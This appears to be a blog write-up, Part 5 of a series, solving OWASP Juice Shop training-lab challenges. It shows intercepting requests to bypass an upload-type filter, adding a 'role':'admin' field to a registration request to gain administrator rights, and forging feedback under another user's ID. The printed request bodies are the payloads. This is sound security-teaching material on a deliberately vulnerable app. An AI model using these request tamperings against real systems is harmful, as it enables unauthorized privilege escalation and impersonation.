---
title: Hacking OWASP Juice Shop: Part 5- Privilege Escalation via Manipulated User Registration
url: https://infosecwriteups.com/hacking-owasp-juice-shop-part-5-privilege-escalation-via-manipulated-user-registration-4b1c5227aa81?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2024-08-13
fetch_date: 2025-10-06T18:04:25.572019
---

# Hacking OWASP Juice Shop: Part 5- Privilege Escalation via Manipulated User Registration

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F4b1c5227aa81&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fhacking-owasp-juice-shop-part-5-privilege-escalation-via-manipulated-user-registration-4b1c5227aa81&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fhacking-owasp-juice-shop-part-5-privilege-escalation-via-manipulated-user-registration-4b1c5227aa81&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-4b1c5227aa81---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-4b1c5227aa81---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

Press enter or click to view image in full size

![]()

# Hacking OWASP Juice Shop: Part 5- Privilege Escalation via Manipulated User Registration

## In the Name of Allah, the Most Beneficent, the Most Merciful. All the praises and thanks be to Allah, the Lord of the ‘Alamin (mankind, jinns and all that exists).

[![callgh0st](https://miro.medium.com/v2/resize:fill:64:64/1*S943nhX0uzpVeh6N-49duw.jpeg)](https://callgh0st.medium.com/?source=post_page---byline--4b1c5227aa81---------------------------------------)

[callgh0st](https://callgh0st.medium.com/?source=post_page---byline--4b1c5227aa81---------------------------------------)

4 min read

·

Aug 6, 2024

--

Listen

Share

I hope you enjoyed [Part 1](https://callgh0st.medium.com/hacking-owasp-juice-shop-part-1-discovering-vulnerabilities-b85e974fb3e5), [Part 2](/hacking-owasp-juice-shop-part-2-exposing-critical-vulnerabilities-in-the-payment-flow-45630ed1633e), [Part 3](https://callgh0st.medium.com/hacking-owasp-juice-shop-part-3-exploiting-insufficient-server-side-checks-bypassing-input-6b4368449c2f) and [Part 4](https://callgh0st.medium.com/hacking-owasp-juice-shop-part4-exploiting-payment-and-input-validation-loopholes-59f6b8485c3e). Here, I’m starting Part 5, which focuses on additional vulnerabilities discovered in OWASP Juice Shop. Here, I’ll delve into issues such as bypassing user role restrictions, posting feedback in another user’s name, and manipulating registration to gain administrative privileges. These vulnerabilities illustrate significant gaps in both application logic and security practices that can be exploited to achieve unauthorized access and perform unintended actions.

**NOTE: I’ll add an important narrative at the end.**

The task is to upload a file that has neither a .pdf nor a .zip extension, as those are the only allowed file types. I selected a .pdf file and clicked submit, but intercepted the request using Burp Suite and removed the .pdf extension from the filename. This allowed me to bypass the file type restriction.

Press enter or click to view image in full size

![]()

Press enter or click to view image in full size

![]()

**Twenty-second vulnerability: Bypassing file type restrictions by modifying the request payload to upload a file without a .pdf or .zip extension.**

The task is to register as a user with administrator privileges. To achieve this:

I tried registering a new user and filled in the necessary details, then intercepted the request. I noticed that when creating my previous test account, the response body included:

```
{
  "id": 22,
  "username": "",
  "email": "testeded@gmail.com",
  "password": "d45fe3b16d7a77630e595cfd5f8d3ba6",
  "role": "customer",
  "deluxeToken": "",
  "lastLoginIp": "undefined",
  "profileImage": "/assets/public/images/uploads/default.svg",
  "totpSecret": "",
  "isActive": true,
  "createdAt": "2024-08-06T11:04:30.886Z",
  "updatedAt": "2024-08-06T11:06:06.468Z",
  "deletedAt": null
}
```

Press enter or click to view image in full size

![]()

In my new request, I decided to append `"role":"admin"` to the request body:

```
{
  "email": "testededte@gmail.com",
  "password": "testededte@gmail.com",
  "passwordRepeat": "testededte@gmail.com",
  "role": "admin",
  "securityQuestion": {
    "id": 1,
    "question": "Your eldest sibling's middle name?",
    "createdAt": "2024-08-06T10:44:12.142Z",
    "updatedAt": "2024-08-06T10:44:12.142Z"
  },
  "securityAnswer": "testededte@gmail.com"
}
```

Press enter or click to view image in full size

![]()

This allowed me to successfully create an account with admin privileges.

**Twenty-third vulnerability: Bypassing user role restrictions to register as an administrator by modifying the request payload.**

The task is to post some feedback in another user’s name. Here’s how I achieved it:

I decided to post a review with the following request body:

```
{
  "captchaId": 1,
  "captcha": "16",
  "comment": "good but soar (anonymous)",
  "rating": 5
}
```

Press enter or click to view image in full size

![]()

In response, I received:

```
{
  "status": "success",
  "data": {
    "id": 11,
    "comment": "good but soar (anonymous)",
    "rating": 5,
    "updatedAt": "2024-08-06T12:50:23.355Z",
    "createdAt": "2024-08-06T12:50:23.355Z",
    "UserId": null
  }
}
```

I then changed “anonymous” to “test+1@gmail.com” in the request body:

NOTE: i didn’t sign in that is why the comment has `anonymous` in bracket.

```
{
  "captchaId": 1,
  "captcha": "16",
  "comment": "good but soar (test+1@gmail.com)",
  "rating": 5
}
```

I sent the request, and it was successful, but I did not receive any message indicating the task had been solved.

Suspecting that the system uses the `UserId` to specify users, I modified the request body to include `UserId`:

```
{
  "captchaId": 1,
  "captcha": "16",
  "comment": "good but soar (test+1@gmail.com)",
  "rating": 5,
  "UserId": 22
}
```

Press enter or click to view image in full size

![]()

This resulted in an internal server error, but the review went through, and I successfully solved the challenge.

**Twenty-fourth vulnerability: Posting feedback in another user’s name by manipulating the request payload to include a different email and** `UserId`**.**

That’s all for now. Thanks for reading! Don’t forget to drop a like. You can subscribe to get the next write-up delivered straight to your inbox.

Look-up Part 1, 2, 3 & 4:

[## Hacking OWASP Juice Shop: Part 1 - Discovering Vulnerabilities

### In the Name of Allah, the Most Beneficent, the Most Merciful. All the praises and thanks be to Allah, the Lord of the…

infosecwriteups.com](/hacking-owasp-juice-shop-part-1-discovering-vulnerabilities-b85e974fb3e5?source=post_page-----4b1c5227aa81---------------------------------------)

[## Hacking OWASP Juice Shop: Part 2 — Exposing Critical Vulnerabilities in the Payment Fl...